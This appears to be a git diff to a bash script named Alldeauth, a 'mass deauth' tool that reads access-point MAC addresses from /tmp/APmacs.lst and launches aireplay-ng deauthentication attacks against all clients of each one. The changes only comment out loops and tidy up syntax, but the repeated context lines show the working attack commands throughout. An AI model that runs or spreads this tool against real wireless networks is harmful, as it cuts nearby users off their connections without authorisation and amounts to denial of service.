@@ -138,14 +138,14 @@ do
 
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."
 
-       for (( b=1; b<=$lineNum; b++ ))
-	do
+#       for (( b=1; b<=$lineNum; b++ ))
+#	do
 	scan1="1"
 	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
 	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
 	curLine=$(($curLine+$x))
-	done
+#	done
 	atk="1"
 done
 }  
@@ -214,14 +214,14 @@ do
 
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."
 
-       for (( b=1; b<=$lineNum; b++ ))
-	do
+#      for (( b=1; b<=$lineNum; b++ ))
+#	do
 	scan1="1"
 	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
 	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
 	curLine=$(($curLine+$x))
-	done
+#	done
 	atk="1"
 done
 }  
@@ -289,14 +289,14 @@ do
 
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."
 
-       for (( b=1; b<=$lineNum; b++ ))
-	do
+#       for (( b=1; b<=$lineNum; b++ ))
+#	do
 	scan1="1"
 	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
 	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
 	curLine=$(($curLine+$x))
-	done
+#	done
 	atk="1"
 done
 }  
@@ -365,14 +365,14 @@ do
 
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."
 
-       for (( b=1; b<=$lineNum; b++ ))
-	do
+#       for (( b=1; b<=$lineNum; b++ ))
+#	do
 	scan1="1"
 	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
 	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
 	curLine=$(($curLine+$x))
-	done
+#	done
 	atk="1"
 done
 }  
@@ -440,14 +440,14 @@ do
 
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."
 
-       for (( b=1; b<=$lineNum; b++ ))
-	do
+#       for (( b=1; b<=$lineNum; b++ ))
+#	do
 	scan1="1"
 	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
 	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
 	curLine=$(($curLine+$x))
-	done
+#	done
 	atk="1"
 done
 }  
@@ -515,14 +515,14 @@ do
 
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."
 
-       for (( b=1; b<=$lineNum; b++ ))
-	do
+#       for (( b=1; b<=$lineNum; b++ ))
+#	do
 	scan1="1"
 	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
 	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
 	curLine=$(($curLine+$x))
-	done
+#	done
 	atk="1"
 done
 }    
@@ -558,7 +558,7 @@ atk="0"
 echo -e "\e[01;32m[>]\e[00m Setting up for the Autokill..."
 
 trap 'cleanup' 2 
-function cleanup() {
+cleanup() {
 	break
 	xterm -geometry 75x12+464+288 -bg black -fg green -T "Mass DeAuth by Linoge - Killing DeAuths.." -e "killall -9 aireplay-ng"
 	exit 0
@@ -612,24 +612,18 @@ do
 
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."
 
-       for (( b=1; b<=$lineNum; b++ ))
-	do
+#       for (( b=1; b<=$lineNum; b++ ))
+#	do
 	scan1="1"
 	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
 	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
 	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth Linoge" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $Mon" &
 	curLine=$(($curLine+$x))
-	done
+#	done
 	atk="1"
 done
 }	
-    
-    
-    
-    
-    
-    
-    
+
 #####################################Menu#######################################################
 show_menu(){
     echo -e "${INTRO_TEXT}               Alldeauth is a deauthecation tool                    ${INTRO_TEXT}"
@@ -645,7 +639,7 @@ show_menu(){
     echo -e "${ENTER_LINE}Please enter a menu option and enter or ${RED_TEXT}enter to exit.   ${NORMAL}"
     read opt
 }
-function option_picked() {
+option_picked() {
     COLOR='\033[01;31m' # bold red
     RESET='\033[00;00m' # normal white
     MESSAGE=${@:-"${RESET}Error: No message passed"}
@@ -686,8 +680,3 @@ while [ opt != '' ]
     esac
 fi
 done
-
-
-
-
-
